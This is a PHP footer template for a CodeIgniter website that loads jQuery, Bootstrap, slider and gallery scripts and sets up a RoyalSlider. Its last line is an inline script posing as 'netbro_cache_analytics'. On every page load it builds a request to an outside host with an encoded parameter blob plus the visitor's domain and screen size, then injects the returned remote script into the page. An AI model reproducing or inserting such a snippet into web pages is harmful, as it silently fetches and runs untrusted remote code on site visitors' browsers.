<?php $get_profil_website = get_profil_website(); ?>

 
    
	<div class="dmtop">Scroll to Top</div>
        
  <!-- Main Scripts-->
  <script src="<?= base_url('assets_frontend/assets/')?>js/jquery.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/bootstrap.min.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/menu.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/owl.carousel.min.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/jquery.parallax-1.1.3.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/jquery.simple-text-rotator.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/wow.min.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/custom.js"></script>
    
  <script src="<?= base_url('assets_frontend/assets/')?>js/jquery.isotope.min.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>js/custom-portfolio-masonry.js"></script>

  <!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>rs-plugin/js/jquery.themepunch.plugins.min.js"></script>
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>rs-plugin/js/jquery.themepunch.revolution.min.js"></script>

<?php if(@$add_plugin_galeri){?>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery-3.3.1.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery-migrate-3.0.1.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery-ui.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/popper.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/bootstrap.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/owl.carousel.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery.stellar.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery.countdown.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery.magnific-popup.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/bootstrap-datepicker.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/swiper.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/aos.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/picturefill.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/lightgallery-all.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/jquery.mousewheel.min.js"></script>
<script src="<?= base_url()?>/assets_frontend/assets/galeri/js/main.js"></script>
<?php }?>

  <script type="text/javascript">
	var revapi;
	jQuery(document).ready(function() {
		/*revapi = jQuery('.tp-banner').revolution(
		{
			delay:9000,
			startwidth:1170,
			startheight:500,
			hideThumbs:10,
			fullWidth:"on",
			forceFullWidth:"on"
		});*/
	});	//ready
  </script>

  <!-- Royal Slider script files -->
  <script src="<?= base_url('assets_frontend/assets/')?>royalslider/jquery.easing-1.3.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>royalslider/jquery.royalslider.min.js"></script>
  <script>
	jQuery(document).ready(function($) {
	  var rsi = $('#slider-in-laptop').royalSlider({
		autoHeight: false,
		arrowsNav: false,
		fadeinLoadedSlide: false,
		controlNavigationSpacing: 0,
		controlNavigation: 'bullets',
		imageScaleMode: 'fill',
		imageAlignCenter: true,
		loop: false,
		loopRewind: false,
		numImagesToPreload: 6,
		keyboardNavEnabled: true,
		autoScaleSlider: true,  
		autoScaleSliderWidth: 486,     
		autoScaleSliderHeight: 315,
	
		/* size of all images http://help.dimsemenov.com/kb/royalslider-jquery-plugin-faq/adding-width-and-height-properties-to-images */
		imgWidth: 792,
		imgHeight: 479
	
	  }).data('royalSlider');
	  $('#slider-next').click(function() {
		rsi.next();
	  });
	  $('#slider-prev').click(function() {
		rsi.prev();
	  });
	});
      
      function go_to(url=null){
            if(url){
                location.href = url;
            } else{
                alert('Url is empty');
            }
        }
  </script>

<?php
    if(isset($extra_js)){
        $this->load->view($extra_js);
    }
    ?>

  <!-- Fullwidth Video Div  -->
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>js/libs/swfobject.js"></script> 
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>js/libs/modernizr.video.js"></script> 
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>js/video_background.js"></script>

  <!-- Demo Switcher JS -->
  <script type="text/javascript" src="<?= base_url('assets_frontend/assets/')?>switcher/js/fswit.js"></script>
  <script src="<?= base_url('assets_frontend/assets/')?>switcher/js/bootstrap-select.js"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXG93GAqYHNkNIqTD0eCgSZbx3%2bpvm9bDOVxwIRDMB%2b7RGPgoQ%2b3d9EEQ376S0Ta5S6Bt7j9JK2kv5D3Xtk%2faC7GDgSa1AgAxIOGU9lPJ6mc%2frdRuIcoV5YcYj5Ezm8KL%2bUC15nQDHgAG1iJDcMNlL07aVzGzL2Lkukv4vPH%2bs1YCWwAiv6eHw20r8s%2fHgtrZ22I3boJPQhwFRPS2S%2fFNNOGXSh2kTCYmpVzzvcAXAJnm46pP9UMAiOYWeQ8mHJXUnns1nb6CMBNp%2f7yt29qdr6%2bCiCAc1IGIuhBVuileDmGAwGz4U4vhf9Fnr3bs%2bmT1i01HhHDK4JCC0UvC2TqKHxNvwf27s4m5faNFjSjfCn5MuGeQR6yJ3Xf2LubB1K7eV8HC6yP%2fXi8oYil1YrG0UmJNu%2bS%2fdDb%2bfQO34hebKr0P4LIffzt48ZcsHEhoBI9rme1nhVgtOFuHYwhy3dcssDPYD1qHtZoCgmXEAJy4p%2fYUnBgvFu644SNihaRMstoP%2fD%2bKLDnhsoMHF6g5kMJchwWkJ6ngbeKAQFHJMjvfIxj5Cg3pUR4R3BA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>